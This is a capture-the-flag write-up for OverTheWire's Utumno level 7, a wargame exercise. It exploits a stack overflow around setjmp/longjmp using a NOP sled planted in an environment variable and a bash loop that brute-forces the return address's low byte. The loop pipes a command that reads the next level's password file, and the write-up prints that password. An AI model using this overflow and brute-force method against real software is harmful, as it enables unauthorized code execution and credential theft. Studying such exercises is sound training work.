# Utumno Level 7 → 8

## Goal

`utumno7` uses `setjmp`/`longjmp` for non-local control flow, with a stack buffer overflow in between. The key detail: the buffer lives across a `setjmp` boundary, so overwriting the return address also needs to survive `longjmp`'s restoration. 140-byte filler + 4-byte address does the job — and because the exact stack address drifts, you brute-force the low byte of the return address until the jump lands in the NOP sled.

## Concepts you'll learn

- How `setjmp`/`longjmp` interact with stack frames (they save and restore registers, but your payload's effects on the saved-state struct still matter)
- Overcoming stack randomisation with a **byte brute-force loop** — try every value of the low byte in a shell `for` loop
- Combining a bash loop with an exploit payload for reliability

## Walkthrough

### 1. Find the offset

```bash
$ gdb -q /utumno/utumno7
(gdb) run $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
# crash
(gdb) p $eip
$ python3 -c "from pwn import *; print(cyclic_find(0x61616166))"
140
```

Offset 140.

### 2. Plant shellcode in an env var

```bash
$ export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*500 + b"<shellcode>")')
$ /tmp/getenv EGG /utumno/utumno7
EGG = 0xffffdaXX    # for example
```

### 3. Brute-force the low byte

Because stack addresses drift, you don't know which exact address inside the NOP sled will work. Loop through candidate low bytes:

```bash
$ for i in $(seq 0 255); do
    BYTE=$(printf '\\x%02x' $i)
    PAYLOAD=$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*140 + b'$BYTE\xda\xff\xff')")
    echo "Trying low byte 0x$(printf '%02x' $i)"
    echo "cat /etc/utumno_pass/utumno8" | /utumno/utumno7 "$PAYLOAD" 2>/dev/null | tee /tmp/out
    if grep -q '^[a-z]\{10\}$' /tmp/out; then
        break
    fi
  done
$ cat /tmp/out
jaeyeetiav
```

When the low byte puts you inside the NOP sled, shellcode runs and your `cat` command prints the password.

### 4. A note on reliability

You can also brute-force more bytes if the high bytes are also unpredictable. For a 32-bit stack that always starts with `0xffff`, only 2 bytes drift — 65536 attempts, which a shell loop can burn through in a few minutes.

## The answer

The password for `utumno8` is:

**`jaeyeetiav`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno7.html>
